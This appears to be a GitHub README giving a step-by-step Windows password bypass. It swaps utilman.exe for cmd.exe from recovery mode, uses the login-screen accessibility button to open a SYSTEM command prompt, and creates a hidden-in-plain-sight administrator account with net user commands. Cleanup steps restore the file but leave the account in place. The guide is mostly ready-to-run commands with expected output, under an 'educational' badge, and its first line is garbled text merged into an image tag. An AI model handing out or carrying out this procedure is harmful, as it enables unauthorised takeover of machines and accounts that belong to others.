yourstallationndowsreenshotsreenshotsururmg width="1536" height="1024" alt="Image" src="https://github.com/user-attachments/assets/63a91761-8891-4f2f-bd13-d71eb56b54c6" />

# Windows Password Bypass & User Creation Guide

![Exploit](https://img.shields.io/badge/Exploit-Utilman%20Bypass-red)
![Shell](https://img.shields.io/badge/Shell-CMD%20%2F%20System32-black?logo=windows-terminal&logoColor=white)
![Security](https://img.shields.io/badge/Type-Local%20Privilege%20Escalation-critical)
![Educational](https://img.shields.io/badge/Purpose-Educational%20Use%20Only-yellow)

**Scenario:** You have physical access to a machine but cannot log in. Windows is installed on Drive **D:**.
**Objective:** Create a new Administrator account using the Command Prompt via the Utility Manager trick.

---

### Phase 1: Accessing Recovery Mode (WinRE)

You need to get to a Command Prompt outside of the running Windows environment.

**Option A: Using a Windows USB Installer (Preferred)**
1.  Insert the Windows Installation USB and boot from it.
2.  When the setup screen appears, press **Shift + F10**.
3.  A Command Prompt window (`X:\Sources>`) will appear.

**Option B: Using "Shift + Restart"**
1.  At the Windows Login screen, hold down the **Shift** key.
2.  While holding Shift, click the Power button on the screen and select **Restart**.
3.  Navigate to: **Troubleshoot** > **Advanced options** > **Command Prompt**.

---

### Phase 2: The Exploit (Swapping System Files)

In this phase, we replace the "Ease of Access" button on the login screen with the Command Prompt.

*Note: Based on my lab PC, my Windows installation is on Drive **D:**.*

1.  **Switch to the System Drive:**
    ```cmd
    D:
    ```
2.  **Navigate to the System32 folder:**
    ```cmd
    cd windows\system32
    ```
3.  **Backup the original Utility Manager:**
    (This is crucial so we can restore it later)
    ```cmd
    ren utilman.exe utilman.bak
    ```
4.  **Replace Utilman with Command Prompt:**
    ```cmd
    copy cmd.exe utilman.exe
    ```
    *Output should say: `1 file(s) copied.`*

5.  **Reboot the machine:**
    ```cmd
    wpeutil reboot
    ```
    *(Or simply close the window and restart normally)*

---

### Phase 3: Payload Execution (Creating the User)

1.  Wait for Windows to boot to the **Login Screen**.
2.  Look for the **Ease of Access** icon (Wheelchair or Person icon) at the bottom-right corner.
3.  **Click the icon.**
    *   Instead of opening the accessibility menu, a **System-level Command Prompt** will open.

4.  **Create the new user:**
    (Replace `username` and `password` with your desired credentials)
    ```cmd
    net user studenty2 123456789 /add
    ```
    *Output: `The command completed successfully.`*

5.  **Elevate the user to Administrator:**
    (This grants full control over the computer)
    ```cmd
    net localgroup administrators studenty2 /add
    ```
    *Output: `The command completed successfully.`*

6.  Close the Command Prompt window.

---

### Phase 4: Login Verification

1.  Look at the user list on the bottom-left of the screen.
2.  Select **`studenty2`** (or the name you created).
3.  Enter the password: **`123456789`**.
4.  Windows will set up the profile and log you in.

---

### Phase 5: Cleanup (Restoration)

**Important for Security Professionals:** You must close the vulnerability you opened. If you leave `cmd.exe` as `utilman.exe`, anyone can walk up to the computer and gain Admin access without a password.

1.  **Boot back into Recovery Mode** (Repeat Phase 1).
2.  **Navigate to the folder:**
    ```cmd
    D:
    cd windows\system32
    ```
3.  **Delete the fake Utilman (the CMD copy):**
    ```cmd
    del utilman.exe
    ```
4.  **Restore the original file:**
    ```cmd
    ren utilman.bak utilman.exe
    ```
5.  **Restart the computer.** The system is now secure again (but you still have your new account).
